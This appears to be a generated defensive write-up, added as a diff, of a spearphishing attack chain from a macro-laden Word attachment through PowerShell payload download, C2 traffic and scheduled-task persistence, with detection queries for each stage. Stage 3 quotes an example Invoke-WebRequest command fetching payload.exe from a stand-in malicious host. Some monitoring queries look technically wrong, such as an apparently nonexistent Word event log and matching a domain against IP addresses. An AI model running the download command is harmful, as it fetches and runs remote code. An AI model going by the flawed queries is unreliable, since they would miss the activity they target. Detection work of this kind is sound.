@@ -1,0 +1,56 @@
+<output>
+Pattern Name: Spearphishing with Malicious Attachments  
+Scenario Overview: An attacker sends a spearphishing email containing a malicious Microsoft Word attachment designed to exploit user trust and prompt execution. The attack progresses through user interaction with the email, leading to the execution of a macro that downloads additional payloads and establishes persistence.
+
+Attack Flow Breakdown:  
+**Stage 1: Initial Access**  
+- **Application Involved**: Outlook  
+- **User Action**: The user receives an email from a seemingly legitimate sender (e.g., admin@338) with a subject line that creates urgency (e.g., "Important Document Attached").  
+- **Key Artifacts**: Email headers, attachment named "Invoice.doc" (malicious Word document).  
+- **Detection Focus**: Monitor for spearphishing indicators in email headers and content, including sender reputation and attachment types.  
+
+**Stage 2: User Interaction with Malicious Attachment**  
+- **Application Involved**: Microsoft Word  
+- **User Action**: The user opens the attachment and is prompted to enable macros to view the content.  
+- **Key Artifacts**: Document properties indicating macros are present, user clicks "Enable Content".  
+- **Detection Focus**: Track the execution of Microsoft Word and the enabling of macros.  
+
+```shell
+# Monitor for macro execution in Word documents
+Get-WinEvent -LogName "Microsoft-Windows-Word/Operational" | Where-Object { $_.Id -eq 1001 -and $_.Message -like "*macro*" }
+```
+
+**Stage 3: Execution of Malicious Macro**  
+- **Application Involved**: Microsoft Word (parent), PowerShell (child)  
+- **User Action**: The macro executes, which runs a PowerShell command to download a secondary payload from a remote server.  
+- **Key Artifacts**: PowerShell command executed, e.g., `Invoke-WebRequest -Uri "http://malicious-site.com/payload.exe" -OutFile "C:\Users\User\Downloads\payload.exe"`.  
+- **Detection Focus**: Monitor for PowerShell execution and network traffic to known malicious domains.  
+
+```shell
+# Monitor PowerShell execution and network requests
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Id -eq 4104 -and $_.Message -like "*Invoke-WebRequest*" }
+```
+
+**Stage 4: Post-Execution Network Activity**  
+- **Application Involved**: Windows Explorer (for file execution)  
+- **User Action**: The user does not directly interact with the downloaded payload, but it is executed automatically by the macro.  
+- **Key Artifacts**: Execution of `payload.exe`, which initiates outbound connections to a command and control (C2) server.  
+- **Detection Focus**: Analyze network traffic for unusual outbound connections, especially to IPs associated with known C2 infrastructure.  
+
+```shell
+# Monitor for outbound connections to known malicious IPs
+Get-NetTCPConnection | Where-Object { $_.RemoteAddress -match "malicious-site.com" }
+```
+
+**Stage 5: Establishing Persistence**  
+- **Application Involved**: Windows Task Scheduler  
+- **User Action**: The malicious payload creates a scheduled task to ensure it runs on system startup.  
+- **Key Artifacts**: Scheduled task created with a command to execute the payload.  
+- **Detection Focus**: Monitor for new scheduled tasks that execute unusual binaries or scripts.  
+
+```shell
+# Monitor for new scheduled tasks
+Get-ScheduledTask | Where-Object { $_.Actions -like "*payload.exe*" }
+```
+
+</output>
